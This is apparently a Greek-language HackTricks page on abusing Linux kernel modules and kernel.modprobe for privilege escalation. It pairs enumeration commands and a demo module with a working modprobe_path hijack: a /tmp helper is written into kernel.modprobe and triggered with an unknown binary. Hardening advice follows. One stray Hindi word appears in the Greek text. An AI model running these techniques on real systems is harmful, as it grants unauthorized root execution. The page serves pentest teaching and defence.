# Κατάχρηση Kernel Modules και modprobe

{{#include ../../banners/hacktricks-training.md}}

## Λανθασμένες ρυθμίσεις των kernel modules και της φόρτωσης modules

Η υποστήριξη kernel modules αποτελεί σημαντικό πεδίο κατά τον έλεγχο Linux privilege escalation. Μην θεωρείτε κάθε μήνυμα για unsigned module από μόνο του exploitable, αλλά χρησιμοποιήστε το για να απαντήσετε σε πρακτικές ερωτήσεις:

- Μπορεί ο τρέχων χρήστης να φορτώσει modules μέσω `sudo`, capabilities ή ενός writable helper path;
- Είναι ακόμα ενεργοποιημένη η φόρτωση modules;
- Είναι απενεργοποιημένο το module signature enforcement;
- Είναι writable οι κατάλογοι modules ή τα αρχεία modules;
- Μπορούν να διαβαστούν τα kernel logs ώστε να επιβεβαιωθεί τι συνέβη;

Γρήγορος έλεγχος:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Ερμηνεία:

- Το `modules_disabled=1` σημαίνει ότι δεν είναι δυνατή η φόρτωση νέων modules μέχρι την επανεκκίνηση.
- Το `module_sig_enforce=1` συνήθως αποκλείει unsigned modules.
- Το `dmesg_restrict=0` επιτρέπει σε unprivileged users να διαβάζουν τα kernel logs σε πολλά συστήματα.
- Τα writable paths κάτω από το `/lib/modules/$(uname -r)/` είναι επικίνδυνα, επειδή η αναζήτηση και το auto-loading modules μπορεί να εμπιστεύονται αυτό το tree.

### Φόρτωση ενός module και ανάγνωση του kernel output

Αν διαθέτετε νόμιμη άδεια για τη φόρτωση ενός local module, το `insmod` εισάγει το ακριβές αρχείο `.ko` που παρέχετε. Η init function του module εκτελείται αμέσως και τα messages που γράφονται με `printk()` εμφανίζονται στα kernel logs.

Ελάχιστο workflow για review ή lab environments:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Εάν το `sudo -l` επιτρέπει τα `insmod`, `modprobe` ή ένα wrapper γύρω από αυτά, αντιμετωπίστε το ως κρίσιμο:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-allowed `insmod`

Ένας κανόνας sudo που επιτρέπει σε έναν χρήστη να εκτελεί το `insmod` δεν είναι συγκρίσιμος με την अनुमति εκτέλεσης ενός συνηθισμένου administrative helper. Ο κώδικας αρχικοποίησης του module εκτελείται σε kernel context μόλις εισαχθεί το `.ko`, επομένως το πρακτικό ερώτημα κατά την αξιολόγηση είναι: «μπορεί ο χρήστης να επιλέξει ή να τροποποιήσει το module που θα φορτωθεί;»

Generic review flow:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Εάν ο χρήστης μπορεί να παρέχει ένα αυθαίρετο `.ko`, ο κανόνας θα πρέπει να αντιμετωπίζεται ως πλήρης παραβίαση του συστήματος σε μια εξουσιοδοτημένη αξιολόγηση. Μια ασφαλέστερη operational πρακτική είναι να αποφεύγεται η ανάθεση της φόρτωσης modules μέσω sudo· εάν αυτό είναι αναπόφευκτο, περιορίστε την ακριβή διαδρομή, την ιδιοκτησία, τα δικαιώματα, την πολιτική υπογραφής και τη διαδικασία αφαίρεσης.

Για ένα harmless pattern δημιουργίας module σε ελεγχόμενο lab, ένα ελάχιστο source και Makefile μοιάζουν ως εξής:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Κατασκευάστε και φορτώστε μόνο σε εξουσιοδοτημένο εργαστήριο:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Έλεγχοι abuse των `kernel.modprobe` / `modprobe_path`

Το `kernel.modprobe` ελέγχει το userspace helper που καλεί ο kernel όταν χρειάζεται assistance για τη φόρτωση modules. Αν ένας attacker μπορεί να το αλλάξει σε writable executable path και να ενεργοποιήσει ένα unknown binary format ή άλλο module request path, μπορεί να οδηγήσει σε εκτέλεση κώδικα ως root.

Ελέγξτε το τρέχον helper:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Ελέγξτε αν μπορείτε να το επηρεάσετε:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Γενικό μοτίβο μόνο για εργαστηριακή χρήση:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Σε hardened systems, αυτό θα πρέπει να αποτυγχάνει, επειδή οι μη προνομιούχοι χρήστες δεν μπορούν να γράψουν στο `kernel.modprobe`, η διαδρομή του helper δεν είναι εγγράψιμη ή οι διαδρομές φόρτωσης modules είναι αποκλεισμένες.

### Έλεγχος εγγράψιμων `/lib/modules`

Οι εγγράψιμοι κατάλογοι modules μπορούν να επιτρέψουν αντικατάσταση modules, φύτευση κακόβουλων modules ή κατάχρηση του auto-load, ανάλογα με το πώς θα κληθεί αργότερα το `modprobe`.

Ελέγξτε τις εγγράψιμες τοποθεσίες:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Εάν εντοπίσετε περιεχόμενο module με δυνατότητα εγγραφής, ελέγξτε πώς εντοπίζονται τα modules:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Αμυντικές σημειώσεις:

- Διατηρείτε το `/lib/modules` με ιδιοκτήτη `root:root` και χωρίς δυνατότητα εγγραφής από χρήστες.
- Ορίστε το `kernel.modules_disabled=1` μετά την εκκίνηση, όπου αυτό είναι λειτουργικά εφικτό.
- Επιβάλετε την υπογραφή modules σε συστήματα που απαιτούν φορτώσιμα modules.
- Παρακολουθείτε εγγραφές στο `/proc/sys/kernel/modprobe`, στο `/lib/modules` και απρόσμενη εκτέλεση των `insmod`/`modprobe`.
{{#include ../../banners/hacktricks-training.md}}
